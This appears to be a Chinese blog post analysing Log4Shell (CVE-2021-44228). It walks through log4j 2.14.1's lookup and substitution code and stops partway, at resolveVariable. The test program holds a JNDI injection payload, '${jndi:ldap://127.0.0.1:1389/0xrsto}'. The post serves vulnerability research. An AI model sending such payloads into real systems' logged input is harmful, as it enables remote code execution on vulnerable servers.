+<h1 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h1><p>参考apache log4j官方文档：<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">https://logging.apache.org/log4j/2.x/security.html</a><br>特别关注2021年年底CVE-2021-44228</p>
+<h1 id="CVE-2021-44228分析"><a href="#CVE-2021-44228分析" class="headerlink" title="CVE-2021-44228分析"></a>CVE-2021-44228分析</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0-beta9到2.14.1</p>
+<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>log4j-2.14.1 jdk1.8_66<br>maven依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE202144228</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(CVE202144228.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/0xrsto&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;error info:&#123;&#125;&quot;</span>,message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>根据JNDI的前置知识，在InitialContext类的lookup方法下断点或者NamingManager类的getObjectFactoryFromReference方法下断点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">163</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">189</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">481</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">456</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">63</span>, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2205</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2159</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2142</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2034</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1899</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">866</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">10</span>, CVE202144228 (org.example)</span><br></pre></td></tr></table></figure>
+
+<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>logger是一个Logger对象，调用error方法，由于Logger中没有error方法，会调用其父类AbstractLogger中的error方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message, <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    logIfEnabled(FQCN, Level.ERROR, <span class="literal">null</span>, message, p0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续调用父类AbstractLogger中的logIfEnabled方法，这里设置Level(日志级别)为ERROR</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否启用了指定的日志级别、标记和消息</span></span><br><span class="line">    <span class="keyword">if</span> (isEnabled(level, marker, message, p0)) &#123;</span><br><span class="line">        logMessage(fqcn, level, marker, message, p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在logMessage方法中使用 messageFactory 创建一个 Message 对象，该对象表示包含消息和参数的格式化消息<br>中间的过程省略，来到Logger的log方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String fqcn, <span class="keyword">final</span> StackTraceElement location,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> Message message, <span class="keyword">final</span> Throwable throwable)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取配置的可靠性策略</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReliabilityStrategy</span> <span class="variable">strategy</span> <span class="operator">=</span> privateConfig.loggerConfig.getReliabilityStrategy();</span><br><span class="line">    <span class="comment">// 检查该策略是否是 LocationAwareReliabilityStrategy 的实例</span></span><br><span class="line">    <span class="keyword">if</span> (strategy <span class="keyword">instanceof</span> LocationAwareReliabilityStrategy) &#123;</span><br><span class="line">        ((LocationAwareReliabilityStrategy) strategy).log(<span class="built_in">this</span>, getName(), fqcn, location, marker, level,</span><br><span class="line">            message, throwable);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        strategy.log(<span class="built_in">this</span>, getName(), fqcn, marker, level, message, throwable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这些都是log4j底层下的东西，继续往后分析，跳过中间步骤<br>来到PatternLayout类的toSerializable方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> StringBuilder <span class="title function_">toSerializable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buffer)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里的formatters是一个PatternFormatter数组</span></span><br><span class="line">    <span class="comment">// 每个PatternFormatter的converter属性都是一个继承LogEventPatternConverter的PatternConverter</span></span><br><span class="line">    <span class="comment">// 这些converter的作用是将不同的信息添加到最终的日志信息中</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> formatters.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        formatters[i].format(event, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (replace != <span class="literal">null</span>) &#123; <span class="comment">// creates temporary objects</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> buffer.toString();</span><br><span class="line">        str = replace.format(str);</span><br><span class="line">        buffer.setLength(<span class="number">0</span>);</span><br><span class="line">        buffer.append(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115163512.png"></p>
+<p>代码断在i为8的时候，formatters[8]是一个MessagePatternConverter对象，调用其format方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 进入这里</span></span><br><span class="line">        converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的converter是MessagePatternConverter，调用其format方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="comment">// 如果msg实现了StringBuilderFormattable接口，进入这里</span></span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="comment">// textRenderer为null，这里直接为toAppendTo</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取初始长度作为偏移量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="comment">// 如果msg实现了MultiFormatStringBuilderFormattable接口</span></span><br><span class="line">        <span class="comment">// 不管进入哪个分支，都需要进行formatTo方法进行格式化，作用是将格式化的内容添加到workingBuilder中</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 进入这里</span></span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 检查workingBuilder中是否存在$&#123;&#125;格式的占位符</span></span><br><span class="line">                <span class="comment">// 得到i为64</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 提取offset到结尾的部分，相当于获取formatTo加上去的内容</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 使用配置对象中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果需要渲染，则使用textRenderer对workingBuilder进行渲染，并将结果追加到toAppendTo中</span></span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 后面可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="comment">// 如果消息实现了MultiformatMessage接口，调用getFormattedMessage方法获取格式化后的消息</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 使用config中的StrSubstitutor替换占位符为相应的值</span></span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行formatTo方法之前<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173350.png"><br>执行完formatTo方法之后<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115173519.png"><br>也就是说msg的formatTo方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}<br>接下来进入for循环，这里主要判断在workingBuilder中是否存在${}格式的占位符，如果存在，就调用config.getStrSubstitutor().replace(event, value)方法进行替换<br>首先进入config.getStrSubstitutor()，进入的是AbstractConfiguration类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> StrSubstitutor <span class="title function_">getStrSubstitutor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> subst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115201706.png"><br>进入StrSubstitutor类的replace方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个StringBuilder对象buf，并将source作为初始内容</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">buf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(source);</span><br><span class="line">    <span class="comment">// 调用substitute方法进行替换操作，如果没有进行替换，则返回原始的source字符串</span></span><br><span class="line">    <span class="keyword">if</span> (!substitute(event, buf, <span class="number">0</span>, source.length())) &#123;</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115211353.png"><br>跳过中间的步骤来到StrSubstitutor类的substitute方法，这个方法用于多级插值的递归处理程序。这是主要的插值方法，用于解析传入文本中包含的所有变量引用的值。<br>这里有一个大的while循环，pos从0开始，从左到右遍历buf，chars的值为“error info:${jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;0xrsto}”</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">    <span class="comment">// 前缀匹配</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">startMatchLen</span> <span class="operator">=</span> prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">    <span class="keyword">if</span> (startMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="comment">// found variable start marker</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape) &#123;</span><br><span class="line">        <span class="comment">// escaped</span></span><br><span class="line">        buf.deleteCharAt(pos - <span class="number">1</span>);</span><br><span class="line">        chars = getChars(buf);</span><br><span class="line">        lengthChange--;</span><br><span class="line">        altered = <span class="literal">true</span>;</span><br><span class="line">        bufEnd--;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 目标在这</span></span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115214250.png"><br>当pos为11的时候能够满足两个if条件(存在”${“)，进入else<br>else里面又存在一个while循环</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// find suffix</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">startPos</span> <span class="operator">=</span> pos;</span><br><span class="line">pos += startMatchLen;</span><br><span class="line"><span class="type">int</span> <span class="variable">endMatchLen</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">nestedVarCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (pos &lt; bufEnd) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substitutionInVariablesEnabled</span><br><span class="line">            &amp;&amp; (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// found a nested variable start</span></span><br><span class="line">        nestedVarCount++;</span><br><span class="line">        pos += endMatchLen;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">    <span class="keyword">if</span> (endMatchLen == <span class="number">0</span>) &#123;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 目标在这</span></span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115215742.png"><br>这里是寻找后缀，即“}”，然后提取出中间的字符串“jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;0xrsto”，进入else中，进入这里<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115221647.png"><br>进入StrSubstitutor类resolveVariable方法</p>
